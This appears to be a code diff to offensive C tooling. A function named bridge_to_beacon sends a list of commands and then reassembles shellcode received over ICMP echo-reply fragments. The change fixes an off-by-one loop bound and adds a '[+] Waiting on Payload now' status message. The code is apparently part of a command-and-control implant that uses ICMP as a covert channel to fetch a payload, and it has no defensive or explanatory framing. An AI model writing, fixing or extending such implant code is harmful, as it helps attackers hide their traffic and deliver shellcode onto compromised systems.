@@ -489,7 +489,7 @@ int bridge_to_beacon() {
 
     const int num_cmds = sizeof(ts_cmds) / sizeof(ts_cmds[0]);
 
-    for (int i = 0; i < num_cmds + 1; i++) {
+    for (int i = 0; i < num_cmds; i++) {
             const char *cmd = ts_cmds[i];
             int total_len = (int)strlen(cmd);
 
@@ -523,6 +523,7 @@ int bridge_to_beacon() {
     ///////////////////////////////////////////////////////////////////////
     ////  Wait for and reassemble all fragments (Echo Replies)
     ///////////////////////////////////////////////////////////////////////
+    printf("[+] Waiting on Payload now");
     uint32_t shellcode_len;
     char* shellcode = recv_icmp_fragments(s, &shellcode_len);
     if (!shellcode) {
